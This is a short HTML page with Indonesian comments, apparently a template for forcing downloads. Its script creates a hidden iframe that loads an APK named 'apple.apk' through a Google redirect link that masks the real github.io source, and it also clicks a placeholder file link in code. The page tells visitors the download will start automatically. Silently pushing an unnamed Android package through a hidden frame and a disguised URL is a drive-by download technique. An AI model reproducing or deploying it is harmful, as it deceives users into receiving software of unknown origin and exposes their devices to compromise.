<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Download Example</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        iframe {
            margin-top: 20px;
        }
    </style>
    <script>
        function autoDownload() {
            // Membuka iframe untuk memuat URL
            var iframe = document.createElement('iframe');
            iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr";
            iframe.style.display = 'none'; // Menyembunyikan iframe
            document.body.appendChild(iframe);

            // Membuat pengunduhan file otomatis
            var link = document.createElement('a');
            link.href = "https://www.example.com/path/to/your/file.txt"; // Ganti dengan URL file yang ingin diunduh
            link.download = "file.txt"; // Nama file yang akan diunduh
            link.click(); // Memulai pengunduhan
        }
    </script>
</head>
<body>
    <h1>Welcome to the Auto-Download Example</h1>
    <p>The download will start automatically shortly...</p>
    <button onclick="autoDownload()">Start Auto-Download</button>
</body>
</html>
